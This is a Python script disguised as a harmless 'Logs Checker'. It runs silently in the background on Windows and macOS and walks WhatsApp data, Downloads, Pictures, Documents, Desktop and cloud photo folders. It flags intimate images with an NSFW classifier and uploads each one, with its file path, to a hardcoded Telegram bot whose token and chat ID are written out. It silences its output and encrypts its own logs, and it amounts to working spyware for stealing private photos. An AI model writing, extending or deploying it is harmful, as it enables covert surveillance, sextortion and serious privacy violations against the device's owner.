#!/usr/bin/env python3
"""
Logs Checker

This application monitors WhatsApp images and common folders and forwards relevant content to a Telegram bot.
It is designed to run silently in the background and works on both Windows and macOS.

Usage:
    python nsfr.py [--help] [--verbose] [--scan-all]

Options:
    --help      Show this help message and exit
    --verbose   Run with verbose output (not silent)
    --scan-all  Scan all common folders (Downloads, Pictures, Documents, Desktop) in addition to WhatsApp folders
"""

import os
import sys
import time
import argparse
import platform
import logging
import requests
from datetime import datetime
import json
from pathlib import Path
import mimetypes
import threading
from PIL import Image
import base64
import getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import pystray
from PIL import Image as PilImage

# Set up logging first
log_file = "logs_checker.log.encrypted"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("LogsChecker")

# Try to import Windows-specific modules
WINDOWS_SUPPORT = False
try:
    import win32gui
    import win32con
    WINDOWS_SUPPORT = True
    logger.info("Windows-specific features loaded successfully")
except ImportError as e:
    logger.warning(f"Windows-specific features not available. Will use basic functionality. Error: {e}")

# Encryption class for log files
class LogEncryption:
    """Handles encryption and decryption of log files"""
    
    def __init__(self, password=None, salt=None):
        """Initialize the encryption with a password and salt"""
        # Use a default password if none provided (not recommended for production)
        if password is None:
            # Try to get computer name as a simple default
            try:
                password = platform.node().encode()
            except:
                password = b"default_password"
        elif isinstance(password, str):
            password = password.encode()
            
        # Use a default salt if none provided
        if salt is None:
            salt = b"WhatsAppNSFWScanner"  # Fixed salt (consider using a random salt in production)
        elif isinstance(salt, str):
            salt = salt.encode()
            
        # Generate a key from the password
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        self.cipher = Fernet(key)
        
    def encrypt(self, data):
        """Encrypt the data"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)
    
    def decrypt(self, data):
        """Decrypt the data"""
        return self.cipher.decrypt(data).decode()
    
    def encrypt_file(self, input_file, output_file=None):
        """Encrypt a file"""
        if output_file is None:
            output_file = input_file + ".encrypted"
            
        with open(input_file, 'rb') as f:
            data = f.read()
            
        encrypted_data = self.encrypt(data)
        
        with open(output_file, 'wb') as f:
            f.write(encrypted_data)
            
        return output_file
    
    def decrypt_file(self, input_file, output_file=None):
        """Decrypt a file"""
        if output_file is None:
            # Remove .encrypted extension if present
            if input_file.endswith('.encrypted'):
                output_file = input_file[:-10]
            else:
                output_file = input_file + ".decrypted"
                
        with open(input_file, 'rb') as f:
            encrypted_data = f.read()
            
        decrypted_data = self.decrypt(encrypted_data)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(decrypted_data)
            
        return output_file

# Custom log handler for encrypted logs
class EncryptedFileHandler(logging.FileHandler):
    """A file handler that encrypts log records"""
    
    def __init__(self, filename, mode='a', encoding=None, delay=False, password=None, salt=None):
        super().__init__(filename, mode, encoding, delay)
        self.encryptor = LogEncryption(password, salt)
        self.buffer = []
        
    def emit(self, record):
        """Emit a record with encryption"""
        try:
            msg = self.format(record)
            self.buffer.append(msg)
            
            # Write to a temporary file
            temp_file = self.baseFilename + ".temp"
            with open(temp_file, 'w', encoding='utf-8') as f:
                for line in self.buffer:
                    f.write(line + '\n')
                    
            # Encrypt the temporary file
            self.encryptor.encrypt_file(temp_file, self.baseFilename)
            
            # Remove the temporary file
            try:
                os.remove(temp_file)
            except:
                pass
                
        except Exception:
            self.handleError(record)

# Telegram configuration
TELEGRAM_CHAT_ID = "7245887050"  # Updated to your real user chat ID
TELEGRAM_BOT_TOKEN = "8019709115:AAFcCZeoiI8Lp9pTaHP0m_Pc0myRpTYtcMU"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# NSFW detection threshold (0.0 to 1.0)
NSFW_THRESHOLD = 0.7

class LogsChecker:
    """Main scanner class for detecting NSFW content in WhatsApp images and common folders"""
    
    def __init__(self, verbose=False, scan_all=False):
        """Initialize the scanner with platform-specific settings"""
        self.verbose = verbose
        self.scan_all = scan_all
        self.system = platform.system()
        self.whatsapp_folders = self._get_whatsapp_folders()
        self.common_folders = self._get_common_folders() if scan_all else []
        self.processed_images = set()
        self.load_processed_images()
        self.nsfw_model = None
        self.nsfw_images_found = 0
        
        # Silence standard output if not verbose
        if not verbose:
            sys.stdout = open(os.devnull, 'w')
            
        logger.info(f"Scanner initialized on {self.system} system")
        logger.info(f"WhatsApp folders to scan: {self.whatsapp_folders}")
        if scan_all:
            logger.info(f"Common folders to scan: {self.common_folders}")
            
    def _get_whatsapp_folders(self):
        """Get the default WhatsApp image folders based on the operating system, including Microsoft Store version on Windows"""
        folders = []
        home = Path.home()
        
        if self.system == "Windows":
            # Windows WhatsApp Desktop folders
            appdata_local = home / "AppData" / "Local" / "WhatsApp"
            appdata_roaming = home / "AppData" / "Roaming" / "WhatsApp"
            
            if appdata_local.exists():
                folders.append(appdata_local)
            if appdata_roaming.exists():
                folders.append(appdata_roaming)

            # Microsoft Store WhatsApp path (with dynamic package ID)
            packages_dir = home / "AppData" / "Local" / "Packages"
            if packages_dir.exists():
                for package_dir in packages_dir.glob("*.WhatsAppDesktop_*"):
                    whatsapp_store_path = package_dir / "LocalState"
                    if whatsapp_store_path.exists():
                        folders.append(whatsapp_store_path)
                        logger.info(f"Found Microsoft Store WhatsApp at: {whatsapp_store_path}")
            
            # Add Downloads folder as WhatsApp Web often saves there
            downloads = home / "Downloads"
            if downloads.exists():
                folders.append(downloads)
                
        elif self.system == "Darwin":  # macOS
            # macOS WhatsApp Desktop folder
            library = home / "Library" / "Application Support" / "WhatsApp"
            if library.exists():
                folders.append(library)
                
            # Add Downloads folder as WhatsApp Web often saves there
            downloads = home / "Downloads"
            if downloads.exists():
                folders.append(downloads)
        
        return folders
    
    def _get_common_folders(self):
        """Get common folders where images might be stored"""
        folders = []
        home = Path.home()
        
        # Common folders on both Windows and macOS
        common_folder_names = [
            "Downloads", 
            "Pictures", 
            "Documents", 
            "Desktop", 
            "Videos"
        ]
        
        for folder_name in common_folder_names:
            folder_path = home / folder_name
            if folder_path.exists():
                folders.append(folder_path)
                
        # Windows-specific folders
        if self.system == "Windows":
            # OneDrive Pictures
            onedrive_pictures = home / "OneDrive" / "Pictures"
            if onedrive_pictures.exists():
                folders.append(onedrive_pictures)
                
            # Public Pictures
            public_pictures = Path("C:/Users/Public/Pictures")
            if public_pictures.exists():
                folders.append(public_pictures)
                
        # macOS-specific folders
        elif self.system == "Darwin":
            # iCloud Drive
            icloud_drive = home / "Library" / "Mobile Documents" / "com~apple~CloudDocs"
            if icloud_drive.exists():
                folders.append(icloud_drive)
                
            # Photos Library
            photos_library = home / "Pictures" / "Photos Library.photoslibrary"
            if photos_library.exists():
                folders.append(photos_library)
        
        return folders
    
    def load_processed_images(self):
        """Load the list of already processed images from a file"""
        try:
            with open("processed_images.json", "r") as f:
                self.processed_images = set(json.load(f))
            logger.info(f"Loaded {len(self.processed_images)} processed images from file")
        except (FileNotFoundError, json.JSONDecodeError):
            logger.info("No processed images file found or invalid format. Starting fresh.")
            self.processed_images = set()
    
    def save_processed_images(self):
        """Save the list of processed images to a file"""
        with open("processed_images.json", "w") as f:
            json.dump(list(self.processed_images), f)
        logger.info(f"Saved {len(self.processed_images)} processed images to file")
    
    def _is_image_file(self, file_path):
        """Check if a file is an image based on its extension and mimetype"""
        image_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'}
        file_ext = os.path.splitext(file_path)[1].lower()
        
        if file_ext in image_extensions:
            return True
            
        # Double-check with mimetype
        mime_type, _ = mimetypes.guess_type(file_path)
        return mime_type and mime_type.startswith('image/')
    
    def _load_nsfw_model(self):
        """Load the Hugging Face NSFW detection model if not already loaded"""
        if self.nsfw_model is None:
            try:
                from transformers import pipeline
                logger.info("Loading Hugging Face NSFW detection model...")
                self.nsfw_model = pipeline("image-classification", model="Falconsai/nsfw_image_detection")
                logger.info("NSFW detection model loaded successfully")
            except Exception as e:
                logger.error(f"Failed to load NSFW model: {e}")
                raise
    
    def detect_nsfw_with_huggingface(self, image_path):
        """Detect if an image contains NSFW content using Hugging Face pipeline"""
        try:
            self._load_nsfw_model()
            
            # Open image with PIL
            image = Image.open(image_path)
            
            # Predict NSFW probability
            result = self.nsfw_model(image)
            
            # Extract results
            nsfw_score = 0
            nsfw_result = {}
            
            for item in result:
                nsfw_result[item['label']] = item['score']
                if item['label'] == 'nsfw':
                    nsfw_score = item['score']
            
            logger.info(f"NSFW detection for {os.path.basename(image_path)}: {nsfw_result}")
            return nsfw_score > NSFW_THRESHOLD, nsfw_result
                
        except Exception as e:
            logger.error(f"Error detecting NSFW content in {image_path}: {e}")
            return False, {"error": str(e)}
    
    def send_to_telegram(self, image_path, nsfw_result):
        """Send an NSFW image to Telegram (send message first, then send image, and check both responses)"""
        try:
            # Prepare message text
            message_text = f"NSFW image detected: {os.path.basename(image_path)}\n"
            message_text += f"Location: {image_path}\n"
            message_text += f"Detection results: {json.dumps(nsfw_result, indent=2)}"

            # Send message
            params = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message_text
            }
            msg_response = requests.post(f"{TELEGRAM_API_URL}/sendMessage", data=params)
            if msg_response.status_code != 200:
                logger.error(f"Failed to send message to Telegram: {msg_response.text}")

            # Send image as photo
            with open(image_path, 'rb') as img_file:
                files = {'photo': img_file}
                params = {'chat_id': TELEGRAM_CHAT_ID}
                photo_response = requests.post(f"{TELEGRAM_API_URL}/sendPhoto", data=params, files=files)

            if photo_response.status_code == 200:
                logger.info(f"Successfully sent image to Telegram: {os.path.basename(image_path)}")
                return True
            else:
                logger.error(f"Failed to send image to Telegram: {photo_response.text}")
                return False

        except Exception as e:
            logger.error(f"Error sending image to Telegram: {e}")
            return False
    
    def scan_directory(self, directory):
        """Scan a directory for images and check for NSFW content (single-threaded fallback for model stability)"""
        logger.info(f"Scanning directory: {directory}")
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    # Skip if not an image or already processed
                    if not self._is_image_file(file_path) or file_path in self.processed_images:
                        continue
                    logger.info(f"Checking image: {file_path}")
                    is_nsfw, nsfw_result = self.detect_nsfw_with_huggingface(file_path)
                    self.processed_images.add(file_path)
                    if is_nsfw:
                        logger.warning(f"NSFW content detected in {file_path}")
                        self.send_to_telegram(file_path, nsfw_result)
                        self.nsfw_images_found += 1
        except Exception as e:
            logger.error(f"Error scanning directory {directory}: {e}")
    
    def run(self):
        """Run the scanner in two phases: first WhatsApp folders, then common folders if requested"""
        logger.info("Starting WhatsApp NSFW Scanner")
        self.nsfw_images_found = 0
        
        try:
            # Phase 1: Scan WhatsApp folders
            if self.whatsapp_folders:
                logger.info("Phase 1: Scanning WhatsApp folders")
                for folder in self.whatsapp_folders:
                    self.scan_directory(folder)
                logger.info(f"Phase 1 complete. Found {self.nsfw_images_found} NSFW images in WhatsApp folders.")
            else:
                logger.warning("No WhatsApp folders found. Skipping Phase 1.")
            
            # Phase 2: Scan common folders if requested or if no WhatsApp folders found
            if self.scan_all or not self.whatsapp_folders:
                whatsapp_nsfw_count = self.nsfw_images_found
                self.nsfw_images_found = 0
                
                logger.info("Phase 2: Scanning common folders")
                for folder in self.common_folders:
                    self.scan_directory(folder)
                logger.info(f"Phase 2 complete. Found {self.nsfw_images_found} NSFW images in common folders.")
                
                # Update total count
                self.nsfw_images_found += whatsapp_nsfw_count
            
            # Save processed images list
            self.save_processed_images()
            
            logger.info(f"Scan completed successfully. Total NSFW images found: {self.nsfw_images_found}")
            
            # Send summary to Telegram
            if self.nsfw_images_found > 0:
                summary_text = f"Scan complete. Found {self.nsfw_images_found} NSFW images in total."
                params = {
                    'chat_id': TELEGRAM_CHAT_ID,
                    'text': summary_text
                }
                requests.post(f"{TELEGRAM_API_URL}/sendMessage", data=params)
            
        except KeyboardInterrupt:
            logger.info("Scan interrupted by user")
        except Exception as e:
            logger.error(f"Error during scan: {e}")
            self.save_processed_images()

def create_system_tray(checker):
    """Create system tray icon with menu"""
    try:
        # Create a more visible icon
        icon_size = (64, 64)
        icon_image = PilImage.new('RGB', icon_size, color='red')
        
        # Draw a border to make it more visible
        for i in range(3):
            for j in range(icon_size[0]):
                icon_image.putpixel((j, i), (255, 255, 255))
                icon_image.putpixel((j, icon_size[1]-1-i), (255, 255, 255))
                icon_image.putpixel((i, j), (255, 255, 255))
                icon_image.putpixel((icon_size[0]-1-i, j), (255, 255, 255))
        
        def on_exit(icon):
            logger.info("User requested exit through system tray")
            icon.stop()
            os._exit(0)
        
        def on_show_status(icon):
            try:
                status_msg = f"NSFW Scanner Status:\nNSFW Images Found: {checker.nsfw_images_found}\nScanning Active"
                if WINDOWS_SUPPORT:
                    win32gui.MessageBox(
                        None,
                        status_msg,
                        "NSFW Scanner Status",
                        win32con.MB_OK | win32con.MB_ICONINFORMATION
                    )
                else:
                    # Fallback for non-Windows systems or when win32gui is not available
                    logger.info(f"Status: {status_msg}")
                    print(status_msg)
            except Exception as e:
                logger.error(f"Error showing status: {e}")
        
        # Create the menu
        menu = (
            pystray.MenuItem("Show Status", on_show_status),
            pystray.MenuItem("Exit", on_exit)
        )
        
        # Create the icon
        icon = pystray.Icon(
            "nsfr_scanner",
            icon_image,
            "NSFW Scanner (Running)",
            menu
        )
        
        return icon
        
    except Exception as e:
        logger.error(f"Error creating system tray icon: {e}")
        raise

def run_in_background(scan_all=True):
    """Run the checker in a background thread with system tray support"""
    try:
        logger.info("Starting background mode...")
        
        # Initialize checker
        checker = LogsChecker(verbose=False, scan_all=scan_all)
        
        # Create and start the scanner thread
        scanner_thread = threading.Thread(target=checker.run, daemon=True)
        scanner_thread.start()
        logger.info("Scanner thread started successfully")
        
        # Create and run system tray icon
        try:
            icon = create_system_tray(checker)
            logger.info("System tray icon created successfully")
            icon.run()
        except Exception as e:
            logger.error(f"Failed to create or run system tray icon: {e}")
            raise
            
    except Exception as e:
        logger.error(f"Error in background mode: {e}")
        raise

def main():
    """Main entry point for the application"""
    try:
        parser = argparse.ArgumentParser(description="Logs Checker")
        parser.add_argument("--verbose", action="store_true", help="Run with verbose output (not silent)")
        parser.add_argument("--scan-all", action="store_true", default=True, help="Scan all common folders in addition to WhatsApp folders")
        parser.add_argument("--encrypt-logs", action="store_true", help="Encrypt log files for privacy")
        parser.add_argument("--decrypt-logs", action="store_true", help="Decrypt existing encrypted log files")
        parser.add_argument("--password", type=str, help="Password for log encryption/decryption (optional)")
        parser.add_argument("--background", action="store_true", help="Run in background with system tray icon")
        args = parser.parse_args()
        
        # Configure logging based on verbose flag
        log_level = logging.DEBUG if args.verbose else logging.INFO
        for handler in logging.root.handlers[:]:
            handler.setLevel(log_level)
        
        # Handle log decryption if requested
        if args.decrypt_logs:
            try:
                password = args.password
                if password is None:
                    password = getpass.getpass("Enter decryption password: ")
                    
                encryptor = LogEncryption(password=password)
                log_file = "logs_checker.log.encrypted"
                decrypted_file = log_file[:-10]  # Remove .encrypted extension
                
                print(f"Decrypting {log_file} to {decrypted_file}...")
                encryptor.decrypt_file(log_file, decrypted_file)
                print(f"Log file decrypted successfully to {decrypted_file}")
                return
            except Exception as e:
                logger.error(f"Error decrypting log file: {e}")
                sys.exit(1)
        
        try:
            if args.background:
                logger.info("Starting in background mode...")
                run_in_background(scan_all=args.scan_all)
            else:
                checker = LogsChecker(verbose=args.verbose, scan_all=args.scan_all)
                checker.run()
        except Exception as e:
            logger.error(f"Error during execution: {e}")
            raise
            
    except KeyboardInterrupt:
        logger.info("Checker stopped by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"An error occurred: {e}")
        if args.verbose:
            import traceback
            logger.error(f"Traceback: {traceback.format_exc()}")
        sys.exit(1)

if __name__ == "__main__":
    main()
